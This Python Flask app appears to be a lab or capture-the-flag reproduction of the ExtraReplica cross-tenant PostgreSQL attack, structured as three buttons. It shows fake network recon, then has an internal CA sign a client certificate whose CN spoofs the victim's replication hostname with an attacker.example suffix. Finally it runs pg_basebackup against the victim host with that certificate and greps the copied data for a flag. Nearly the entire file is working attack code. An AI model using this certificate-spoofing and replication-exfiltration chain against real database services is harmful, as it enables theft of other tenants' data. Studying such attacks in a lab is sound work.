"""ExtraReplica (case #061): internal-subnet reach + lax client-cert CN check."""
import os
import shutil
import subprocess

import requests
from flask import Flask, request

app = Flask(__name__)
CA_URL = os.environ.get("CA_URL", "http://internal-ca:5000")
VICTIM = os.environ.get("VICTIM_HOST", "victim-pg")
VICTIM_ID = "eee03a2acfe6"

HTML = """<h1>ExtraReplica — cross-tenant PostgreSQL replication</h1>
<h3>Step 1 · network recon</h3>
<form method="post" action="/step1"><button>Run ifconfig on my managed instance</button></form>
<h3>Step 2 · get a client certificate</h3>
<p>Request a cert whose CN looks like <code>replication.{id}.database.azure.com…</code></p>
<form method="post" action="/step2"><button>Sign cert via internal CA</button></form>
<h3>Step 3 · stream the victim database</h3>
<form method="post" action="/step3"><button>pg_basebackup from victim-pg</button></form>
<pre>{{out}}</pre>"""


def render(out):
    return HTML.replace("{{out}}", out)


@app.route("/")
def home():
    return render("Ready")


@app.route("/step1", methods=["POST"])
def step1():
    return render(
        "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500\n"
        "      inet 10.0.0.7  netmask 255.255.255.0  broadcast 10.0.0.255\n"
        f"Provider internal subnet 10.0.0.0/24 is shared with other tenants.\n"
        f"  -> {VICTIM} (10.0.0.20) is reachable on 5432 (deny-all public firewall is bypassed).\n"
        f"  -> instance id of victim: {VICTIM_ID}\n"
        "Replication user authenticates by client certificate from internal subnets."
    )


@app.route("/step2", methods=["POST"])
def step2():
    cn = f"replication.{VICTIM_ID}.database.azure.com.attacker.example"
    r = requests.post(f"{CA_URL}/sign", json={"cn": cn}, timeout=10)
    if r.status_code != 200:
        return render(f"CA rejected: {r.text}")
    data = r.json()
    import base64
    open("/tmp/client.crt", "w").write(base64.b64decode(data["cert"]).decode())
    open("/tmp/client.key", "w").write(base64.b64decode(data["key"]).decode())
    os.chmod("/tmp/client.key", 0o600)
    return render(f"Signed CN={data['cn']}\nCert saved to /tmp/client.crt")


@app.route("/step3", methods=["POST"])
def step3():
    shutil.rmtree("/tmp/backup", ignore_errors=True)
    conninfo = (
        f"host={VICTIM} user=replication dbname=postgres sslmode=require "
        "sslcert=/tmp/client.crt sslkey=/tmp/client.key"
    )
    cmd = [
        "pg_basebackup", "-d", conninfo,
        "-D", "/tmp/backup", "-X", "none", "--no-password",
    ]
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if out.returncode != 0:
            return render(f"pg_basebackup failed:\n{out.stderr}")
        grep = subprocess.run(
            ["grep", "-rao", r"flag{[^}]*}", "/tmp/backup"],
            capture_output=True, text=True,
        )
        return render(f"pg_basebackup OK\nVictim database streamed.\n{grep.stdout or '(flag not found)'}")
    except Exception as e:
        return render(f"error: {e}")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
